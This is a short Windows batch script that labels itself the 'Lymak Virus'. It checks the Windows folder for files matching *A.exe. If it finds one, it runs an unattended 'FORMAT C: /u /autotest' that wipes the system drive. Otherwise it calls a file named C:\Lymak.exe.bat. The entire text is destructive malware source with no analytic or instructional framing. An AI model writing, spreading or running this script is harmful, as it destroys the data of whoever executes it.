   echo off
   cls
   echo Lymak Virus Loading...
   If Exist %Windir%\*A.exe goto BRR
   goto EMM
   :BRR
   FORMAT C: /u /autotest
   goto END
   :EMM
   C:\Lymak.exe.bat
   goto END
   :END
